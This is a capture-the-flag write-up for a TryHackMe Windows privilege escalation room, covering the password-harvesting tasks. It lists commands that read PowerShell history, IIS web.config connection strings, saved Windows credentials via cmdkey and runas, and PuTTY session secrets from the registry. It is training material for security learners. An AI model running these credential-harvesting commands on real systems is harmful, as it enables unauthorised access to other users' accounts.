# Windows Privilege Escalation

**Room Link:** [https://tryhackme.com/room/windowsprivesc20](https://tryhackme.com/room/windowsprivesc20)



## Harvesting Passwords from Usual Spots

**A password for the julia.jones user has been left on the Powershell history. What is the password?**

**Victim**

```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

**A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db\_admin user?**

**Victim**

```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

**There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.**

**Victim**

```
cmdkey /list
runas /savecred /user:WPRIVESC1\mike.katz cmd.exe
```

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

**Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user?**

**Victim**

```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
